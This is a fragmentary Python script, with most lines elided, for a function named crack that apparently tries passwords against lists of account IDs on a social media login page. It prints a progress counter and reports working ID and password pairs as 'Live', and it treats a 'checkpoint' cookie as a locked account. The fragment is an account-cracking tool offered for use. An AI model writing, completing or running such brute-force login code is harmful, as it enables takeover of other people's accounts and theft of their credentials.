...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r \x1b[1;37m[\x1b[1;32mRaWa\x1b[1;32m] : {loop}×{len(id)} \x1b[1;32m[{ok}] \x1b[1;31m\x1b[1;37m \x1b[1;34m{'{:.0%}'.format(loop/float(len(id)))}  "),
    sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                break
                #print(f'\033[1;31mPUBG-CP\033[1;31m{idf} |  \033[1;31m{pw}  ')
                ...
                print(f'\r\033[1;92m[ Live - RaWa404] {idf}|{pw} ')
